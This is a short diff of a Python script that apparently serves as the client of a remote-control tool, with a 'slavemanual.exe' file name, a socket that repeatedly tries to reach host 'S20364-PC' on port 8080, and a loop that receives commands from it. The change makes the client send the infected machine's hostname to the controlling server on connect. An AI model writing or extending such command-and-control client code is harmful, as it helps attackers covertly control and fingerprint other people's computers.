@@ -17,6 +17,7 @@ filename = "slavemanual.exe"
 fullpath = os.path.join(director, filename)
 s = socket.socket()
 host = "S20364-PC"
+hostname = socket.gethostname()
 port = 8080
 connected = False
 while not connected:
@@ -29,7 +30,7 @@ while not connected:
 
 
 # print("Connected to server!")
-
+s.send(hostname.encode())
 while True:
     try:
         command = s.recv(1024)
